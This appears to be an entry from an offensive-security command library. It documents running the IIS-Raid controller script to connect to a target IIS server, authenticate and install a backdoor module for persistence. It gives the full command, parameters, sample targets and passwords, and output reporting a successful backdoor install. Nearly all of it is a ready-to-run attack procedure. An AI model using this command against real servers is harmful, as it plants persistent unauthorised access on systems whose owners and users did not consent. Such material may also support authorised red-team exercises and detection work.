---
id: df75cd0f-26f2-4a94-8e19-6dfa14eabf28
name: python-execute-iis-controller
type: command
executor: bash
data: 'python iis_controller.py --url http://$_TARGET_URL/ --password $_PASSWORD'
output: null
created_at: '2023-04-06T03:56:27.931423+00:00'
updated_at: '2023-04-10T20:37:21.199886+00:00'
platforms:
  - Linux
  - macOS
tags:
  - persistence
  - iis
verified: true
validated: true
---

# python-execute-iis-controller

## Command

```bash
python iis_controller.py --url http://$_TARGET_URL/ --password $_PASSWORD
```

## Description

Executes the IIS-Raid controller script to connect to a target IIS server, authenticate with a password, and stage the backdoor module remotely. This command is run from the cloned IIS-Raid directory on the attacker's machine.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --url http://$_TARGET_URL/ | Target IIS server URL (e.g., http://192.168.1.11/) | Yes |
| --password $_PASSWORD | Simple password for backdoor authentication (e.g., SIMPLEPASS) | Yes |

## Examples

### Basic Usage

```bash
python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
```

### With HTTPS

```bash
python iis_controller.py --url https://target.com/ --password MyPass123
```

## Expected Output

Connecting to http://192.168.1.11/...
Authentication successful.
Uploading backdoor module...
Backdoor installed successfully.

No errors in connection or upload.

## Related

- [[procedures/IIS-Raid-Backdoor-Persistence]]
- [[commands/git-clone-iis-raid-repo]]
